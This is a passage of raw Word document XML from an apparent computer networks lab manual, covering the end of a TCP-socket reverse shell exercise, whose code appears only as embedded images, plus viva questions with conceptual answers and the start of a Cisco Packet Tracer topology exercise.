        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2368BF0C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Client:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0475EDB4" w14:textId="3EEFEC1B" w:rsidR="0094061E" w:rsidRDefault="0021074C" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="0021074C">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="154193DD" wp14:editId="0FD246C7">
            <wp:extent cx="5731510" cy="1504315"/>
            <wp:effectExtent l="0" t="0" r="2540" b="635"/>
            <wp:docPr id="271342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42259" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId48"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="1504315"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2CCAAA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="40679F0B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="624D472E" w14:textId="1E1EB319" w:rsidR="0094061E" w:rsidRDefault="006445B7" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="006445B7">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1AC976B7" wp14:editId="3DDBF989">
            <wp:extent cx="5731510" cy="5821045"/>
            <wp:effectExtent l="0" t="0" r="2540" b="8255"/>
            <wp:docPr id="109799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99193" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId49"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="5821045"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF338CA" w14:textId="77777777" w:rsidR="00B44971" w:rsidRDefault="00B44971" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49B095EA" w14:textId="365D78E2" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1674028F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Thus a program was developed and executed to reverse shell using TCP Sockets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B92E589" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="177228DB" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D7CC4CF" w14:textId="3B145E4B" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Viva Questions </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469725C5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is a TCP socket?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F90D7F9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A TCP socket is an endpoint used for reliable, connection-oriented communication between two devices over a network using the TCP protocol.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BA4A64" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. What is a reverse shell?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC4BD7D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A reverse shell is a program in which a client system initiates a connection to a server, allowing remote command execution. It should be used only in authorized lab environments for educational purposes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A6321C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Which Python module is used for TCP socket programming?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57DD43DF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:The socket module is used in Python to create and manage TCP sockets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E81AAD6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F83B201" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A50972B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. What is the difference between a client and a server in socket programming?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C43F6A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A server waits for incoming connections, while a client initiates a connection to the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C18378" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Why is TCP preferred for remote communication applications?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DD9B1D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:TCP provides reliable, ordered, and error-checked delivery of data, ensuring that information reaches the destination correctly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D947F94" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F8B7FB" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14EF14A7" w14:textId="4E6D162E" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Ex.No:9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F813E0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="006445B7">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>DESIGN A SIMPLE TOPOLOGY USING CISCO PACKET TRACER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="721F3D9B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338B5D38" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To design and configure a simple network topology with one router, two switches, and four PCs in Cisco Packet Tracer for successful inter-network communication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0483F534" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Procedure:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556286C9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Launch Cisco Packet Tracer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7913A708" w14:textId="5536E991" w:rsidR="00B22A13" w:rsidRPr="005B6C3A" w:rsidRDefault="00000000" w:rsidP="005B6C3A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Open Cisco Packet Tracer on your system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3496402A" w14:textId="36AB3A6A" w:rsidR="00B22A13" w:rsidRPr="005B6C3A" w:rsidRDefault="00000000" w:rsidP="005B6C3A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Ensure the workspace and device categories (Routers, Switches, End Devices, etc.) are visible.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD99E04" w14:textId="01FBD13A" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Add Network Devices</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB3102A" w14:textId="47A9926E" w:rsidR="00B22A13" w:rsidRPr="005B6C3A" w:rsidRDefault="00000000" w:rsidP="009C3CA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>From the Routers section, drag one router onto the workspace.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E0A1BD3" w14:textId="4F634F9D" w:rsidR="00B22A13" w:rsidRPr="005B6C3A" w:rsidRDefault="00000000" w:rsidP="009C3CA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>From the Switches section, drag two 2960 switches.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0503DDCD" w14:textId="2FF22915" w:rsidR="00B22A13" w:rsidRPr="005B6C3A" w:rsidRDefault="00000000" w:rsidP="009C3CA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>From the End Devices section, drag four PCs (PC1, PC2, PC3, PC4).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8FE6DB" w14:textId="781EC572" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="009C3CA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="005B6C3A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Rename the devices.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D982C83" w14:textId="11DAA336" w:rsidR="0094061E" w:rsidRDefault="00E84B90" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00E84B90">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0BB41820" wp14:editId="731F7305">
            <wp:extent cx="5859780" cy="4209415"/>
            <wp:effectExtent l="0" t="0" r="7620" b="635"/>
            <wp:docPr id="944586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586812" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId50"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5859780" cy="4209415"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="745A58C4" w14:textId="77777777" w:rsidR="00E84B90" w:rsidRDefault="00E84B90" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75B66E3D" w14:textId="77777777" w:rsidR="00E84B90" w:rsidRDefault="00E84B90" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65F0B5FC" w14:textId="77777777" w:rsidR="00E84B90" w:rsidRDefault="00E84B90" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F4708FC" w14:textId="77777777" w:rsidR="009C3CA4" w:rsidRDefault="009C3CA4" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71F065F8" w14:textId="155A2B97" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Connect the Devices</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E84C6C4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Use Copper Straight-Through cables to connect:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36CA27CB" w14:textId="1E4F492F" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="009C3CA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="009C3CA4">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>PC1 to Switch1 using port FastEthernet0/1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020608C3" w14:textId="76E573EB" w:rsidR="006445B7" w:rsidRPr="00E84B90" w:rsidRDefault="00000000" w:rsidP="009C3CA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="009C3CA4">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>PC2 to Switch1 using port FastEthernet0/2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375E7DD0" w14:textId="2D2598B2" w:rsidR="006445B7" w:rsidRPr="009C3CA4" w:rsidRDefault="00000000" w:rsidP="009C3CA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009C3CA4">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>PC3 to Switch2 using port FastEthernet0/1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00DE3C44" w14:textId="165FB30B" w:rsidR="006445B7" w:rsidRPr="009C3CA4" w:rsidRDefault="00000000" w:rsidP="009C3CA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
